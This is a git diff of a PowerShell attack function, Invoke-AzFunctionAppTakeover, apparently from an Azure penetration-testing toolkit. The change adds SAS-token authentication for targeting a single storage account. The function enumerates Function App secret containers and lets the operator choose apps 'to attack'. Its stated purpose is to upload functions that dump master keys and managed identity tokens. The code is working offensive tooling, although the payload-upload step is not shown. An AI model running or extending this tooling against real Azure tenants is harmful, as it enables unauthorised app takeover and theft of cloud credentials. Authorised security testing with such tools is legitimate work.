@@ -14,10 +14,21 @@ function Invoke-AzFunctionAppTakeover{
         PowerShell function for dumping information from Azure Function Apps via Storage Account manipulation and authenticated Az PowerShell connections.
 	.DESCRIPTION
         The function will scan available Azure Storage Accounts for those that are supporting Azure Function Apps. Storage Accounts and the corresponding Function Apps can then be selected and files will be uploaded to add new functions that will dump available information (Master Keys and Managed Identity Tokens) from an Azure Function App.
-	.PARAMETER Subscription
-        The Subscription name to use. - Optional
+	.PARAMETER Az
+        Use Az PowerShell authentication mode (Connect-AzAccount, etc.). Mutually exclusive with -Sas.
+    .PARAMETER Sas
+        Use SAS token authentication mode. Requires both -StorageAccountName and -SasToken. Mutually exclusive with -Az.
+    .PARAMETER Subscription
+        The Subscription name to use.
+        Optional – used only when -Az authentication mode is selected.
+    .PARAMETER StorageAccountName
+        The name of the target storage account.
+        Mandatory when using -Sas mode.
+    .PARAMETER SasToken
+        The SAS token to authenticate access to the storage account.
+        Mandatory when using -Sas mode.
     .EXAMPLE
-        PS C:\> Invoke-AzFunctionAppTakeover -Verbose
+        PS C:\> Invoke-AzFunctionAppTakeover -Az -Verbose
 		VERBOSE: Currently logged in via Az PowerShell as kfosaaen@notatenant.com
         VERBOSE: Use Connect-AzAccount to change your user
         VERBOSE: Dumping Function App information for Selected Subscriptions...
@@ -54,37 +65,38 @@ function Invoke-AzFunctionAppTakeover{
 #>
 
 
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory=$false,
-        HelpMessage="Subscription name to use.")]
-        [string]$Subscription = ""
+    [CmdletBinding(DefaultParameterSetName = "Az")]
+    param (
+        [Parameter(Mandatory = $true,
+                ParameterSetName = "Az",
+                HelpMessage = "Authentication mode: Az")]
+        [switch]$Az,
+
+        [Parameter(Mandatory = $true,
+                ParameterSetName = "Sas",
+                HelpMessage = "Authentication mode: Sas")]
+        [switch]$Sas,
+
+        [Parameter(Mandatory = $false,
+                HelpMessage = "Subscription name to target.",
+                ParameterSetName = "Az")]
+        [string]$Subscription = "",
+
+        [Parameter(Mandatory = $true,
+                ParameterSetName = "Sas",
+                HelpMessage = "Storage account name to target.")]
+        [string]$StorageAccountName,
+
+        [Parameter(Mandatory = $true,
+                ParameterSetName = "Sas",
+                HelpMessage = "SasToken for the storage account.")]
+        [string]$SasToken
     )
-
-    # Subscription name is required, list sub names in gridview if one is not provided
-    if ($Subscription){}
-    else{
-
-        Write-Verbose "Currently logged in via Az PowerShell as $((Get-AzContext).Account.Id)"; Write-Verbose 'Use Connect-AzAccount to change your user'
-
-        # List subscriptions, pipe out to gridview selection
-        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
-        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-
-        if($subChoice.count -eq 0){Write-Verbose 'No subscriptions selected, exiting'; break}
-
-        Write-Verbose "Dumping Function App information for Selected Subscriptions..."
-
-        # Recursively iterate through the selected subscriptions and pass along the parameters
-        Foreach ($sub in $subChoice){Select-AzSubscription -Subscription $sub.Name | Out-Null; Invoke-AzFunctionAppTakeover -Subscription $sub.Name}
-        break
-
-    }
 
     <#
         Optional Future Additions 
             - web shell upload
-            - Support for Storage Account Access Keys and SAS tokens
+            - Support for Storage Account Access Keys
             - Dump all the function app info (API endpoints), all keys, env variables
             - Extraction of key vault references in configuration app settings
             - Add logic for multi-language functions (ps1 files in an ASP function)
@@ -96,15 +108,48 @@ function Invoke-AzFunctionAppTakeover{
 
     #>
 
-    
-    Write-Verbose "`tEnumerating Function App attached Storage Accounts in the $Subscription subscription"
+    if ($Az) {
+        if (-not $Subscription) {
+            Write-Verbose "Currently logged in via Az PowerShell as $((Get-AzContext).Account.Id)"; Write-Verbose 'Use Connect-AzAccount to change your user'
 
-    # Try to enumerate the Storage Accounts
-    $storageAccounts = Get-AzStorageAccount
-    $functionStorageAccounts = @()
+            # List subscriptions, pipe out to gridview selection
+            $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
+            $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
 
-    # If one or more Storage Accounts, Continue
-    if($storageAccounts.Count -eq 0){Write-Verbose "No available Storage Accounts in the $Subscription subscription"}
+            if($subChoice.count -eq 0){Write-Verbose 'No subscriptions selected, exiting'; break}
+
+            Write-Verbose "Dumping Function App information for Selected Subscriptions..."
+
+            # Recursively iterate through the selected subscriptions and pass along the parameters
+            Foreach ($sub in $subChoice){Select-AzSubscription -Subscription $sub.Name | Out-Null; Invoke-AzFunctionAppTakeover -Az -Subscription $sub.Name}
+            break
+
+        }
+
+        Write-Verbose "`tEnumerating Function App attached Storage Accounts in the $Subscription subscription"
+
+        # Try to enumerate the Storage Accounts
+        $storageAccounts = Get-AzStorageAccount
+        # If one or more Storage Accounts, Continue
+        if($storageAccounts.Count -eq 0){Write-Verbose "No available Storage Accounts in the $Subscription subscription"}
+    } elseif ($Sas) {
+        if (-not $SasToken) {
+            throw "In -Sas mode, -SasToken must be specified."
+        }
+        if (-not $StorageAccountName) {
+            throw "In -Sas mode, -StorageAccountName specified."
+        }
+
+        Write-Verbose "`tUsing SAS Token to authenticate against Storage Account: $StorageAccountName"
+        $storageAccounts = @(
+            [PSCustomObject]@{
+                StorageAccountName = $StorageAccountName
+                ResourceGroupName  = ""
+            }
+        )
+    } else {
+        throw "Neither -Az nor -Sas mode selected. One must be chosen."
+    }
 
     # Create data table to house accounts
     $TempTblaccts = New-Object System.Data.DataTable 
@@ -120,38 +165,40 @@ function Invoke-AzFunctionAppTakeover{
     $TempTblkeys.Columns.Add("VaultToken") | Out-Null
     $TempTblkeys.Columns.Add("GraphToken") | Out-Null
 
-    $storageAccounts | ForEach-Object{
-            
-        try{
+    foreach ($acct in $storageAccounts) {
+        try {
             # Set Context for current Storage Account
-            $currentContext = (Get-AzStorageAccount -ResourceGroupName $_.ResourceGroupName -Name $_.StorageAccountName -ErrorAction Stop).Context
+            $currentContext = if ($Sas) {
+                New-AzStorageContext -StorageAccountName $StorageAccountName -SasToken $SasToken -ErrorAction Stop
+            } else {
+                (Get-AzStorageAccount -ResourceGroupName $acct.ResourceGroupName -Name $acct.StorageAccountName -ErrorAction Stop).Context
+            }
             # List the Containers for the Storage Account that match "azure-webjobs-secrets"
-            $containerList = Get-AzStorageContainer -Context $currentContext -ErrorAction Stop | where Name -eq "azure-webjobs-secrets"
+            $containerList = Get-AzStorageContainer -Context $currentContext -ErrorAction Stop | Where-Object Name -eq "azure-webjobs-secrets"
         }
-        catch{$containerList = $null}
-        
-        if($containerList -ne $null){
+        catch {$containerList = $null}
+
+        if ($containerList) {
             # Review Container names for "azure-webjobs-hosts", add to data table
-            $containerList | ForEach-Object{
+            foreach ($container in $containerList) {
                 # At the secrets container level, get all the blobs, call out the ones with host.json
-                Get-AzStorageBlob -Context $currentContext -Name $_.Name | select Name | where Name -Match "host.json" | ForEach-Object{
-                    $TempTblaccts.Rows.Add($currentContext.StorageAccountName, ($_.Name).Split("/")[0]) | Out-Null
-                    Write-Verbose "`t`tFunction App Storage Account Found - $($currentContext.StorageAccountName) - $(($_.Name).Split("/")[0]) Function App"
-                }
+                Get-AzStorageBlob -Context $currentContext -Container $container.Name | 
+                    Where-Object Name -Match "host.json" | ForEach-Object {
+                        $funcAppName = ($_.Name).Split("/")[0]
+                        $TempTblaccts.Rows.Add($currentContext.StorageAccountName, $funcAppName) | Out-Null
+                        Write-Verbose "`t`tFunction App Storage Account Found - $($currentContext.StorageAccountName) - $funcAppName Function App"
+                    }
             }
         }
     }
-        
 
-    Write-Verbose "`t$($TempTblaccts.Rows.Count) Function App Storage Accounts Enumerated in the Subscription"
+    Write-Verbose "`t$($TempTblaccts.Rows.Count) Function App Storage Accounts Enumerated"
 
     # Out-gridview list of Function App SAs to select from
-    $selectedStorageAccounts = $TempTblaccts | sort -Property "FunctionApp" | out-gridview -Title "Select One or More Storage Accounts / Function Apps to attack" -PassThru
+    $selectedStorageAccounts = $TempTblaccts | Sort-Object -Property "FunctionApp" | Out-GridView -Title "Select One or More Storage Accounts / Function Apps to attack" -PassThru
 
     if($selectedStorageAccounts.count -eq 0){Write-Verbose 'No Storage Accounts selected'}
     else{
-
-        
         Write-Verbose "`tDumping Function App information for selected Storage Accounts"
 
         # Take list of selected SAs and go through the takeover process
@@ -179,7 +226,11 @@ function Invoke-AzFunctionAppTakeover{
                 $currentApp = $_.FunctionApp
 
                 # Set Storage Context
-                $storageContext = (Get-AzStorageAccount -ResourceGroupName $currentStorage.ResourceGroupName -Name $currentStorage.StorageAccountName).Context
+                $storageContext = if($Sas) {
+                    $currentContext
+                } else {
+                    (Get-AzStorageAccount -ResourceGroupName $currentStorage.ResourceGroupName -Name $currentStorage.StorageAccountName).Context
+                }
             
                 # Hack-ish filter to get the desired Function App - Share name conventions should be FunctionAppNameAB12, where AB12 is 4 random numbers/letters
                 $fileShareList = Get-AZStorageShare -Context $storageContext | where Name -Match $_.FunctionApp
